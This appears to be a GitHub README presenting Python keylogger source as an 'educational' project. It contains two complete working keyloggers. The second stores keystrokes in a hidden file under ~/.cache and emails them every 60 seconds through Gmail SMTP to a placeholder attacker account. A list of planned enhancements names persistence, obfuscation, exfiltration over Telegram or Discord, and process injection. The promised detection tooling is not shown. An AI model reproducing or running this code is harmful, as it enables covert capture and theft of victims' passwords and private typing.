# 🕵️‍♂️ Python Keylogger Simulation (Educational Project)

<p align="center">
  <b>Learn Offensive → Build Stronger Defense</b><br>
  <i>Understand how attackers operate &amp; how defenders respond</i>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Purpose-Educational-blue">
  <img src="https://img.shields.io/badge/Language-Python%203.x-green">
  <img src="https://img.shields.io/badge/Status-Active-orange">
  <img src="https://img.shields.io/badge/License-Ethical%20Use-red">
</p>

---

## 🎯 About This Project

This project simulates how keyloggers work — one of the oldest cyber-attack techniques — and, more importantly, demonstrates how they can be **detected and defended** against.

- 🧠 **Goal:** Understand attacker behavior to build stronger Blue Team defense tools.
- ⚠️ **Disclaimer:** Intended for **educational and research purposes only**.

---

## 📦 Project Versions

| Version | Description |
| ------- | ----------- |
| **v1**  | Basic keylogger — captures keystrokes and saves them to `keylog.txt` |
| **v2**  | Advanced keylogger — captures keystrokes, exfiltrates via email, and stores a hidden backup |
| **v3**  | *Coming soon:* Real-time dynamic detection script &amp; YARA rule for static detection |

---

## 📄 Code Examples & Explanation

### 🔥 Version 1 — Basic Keylogger

```python
from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as log:
        try:
            log.write(f"{key.char}")
        except AttributeError:
            log.write(f" [{key}] ")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
```

📝 Explanation:
A straightforward keylogger that writes keystrokes to keylog.txt using the pynput library. Special keys (e.g., Enter, Space) are logged within brackets.

### 🔥 Version 2 — Keylogger with Email Exfiltration

```python
import pynput.keyboard
import threading
import smtplib
import os

log = ""
log_dir = os.path.expanduser("~/.cache")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, ".syslog_hidden")

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f" [{key}] "

def send_mail():
    global log
    if log:
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login("attackerEmail@gmail.com", "attackerPassword")
            server.sendmail("attackerEmail@gmail.com", "attackerEmail@gmail.com", log)
            server.quit()
        except Exception as e:
            pass
        with open(log_file, "a") as f:
            f.write(log + "\n")
        log = ""

    timer = threading.Timer(60, send_mail)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
keyboard_listener.start()
send_mail()
keyboard_listener.join()

```
📝 Explanation:
This version enhances functionality by sending keystroke logs to an email every 60 seconds using smtplib. It also creates a hidden backup file (.syslog_hidden) in the system's cache directory.

💡 Future Enhancements
Persistence: Auto-run on startup via system registry or startup folder.

Obfuscation: Use Base64 encoding or package with PyInstaller to hinder analysis.

Network Exfiltration: Transmit logs via alternative channels like Telegram or Discord.

Process Injection: Explore advanced evasion through process injection techniques.

Real-Time Detection: Develop dynamic detection tools for Blue Team process monitoring.

☕ Support My Cybersecurity Learning Journey
<p align="center"> <a href="https://buymeacoffee.com/sudersen" target="_blank"> <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" height="50" width="210" alt="Buy Me A Coffee" /> </a> </p>

⚠️ Disclaimer
This project is exclusively for educational and ethical cybersecurity training purposes. Unauthorized use is both illegal and unethical.

📬 Let's Connect
🔗 LinkedIn: www.linkedin.com/in/drsudersen

☕ Buy Me a Coffee : https://buymeacoffee.com/sudersen
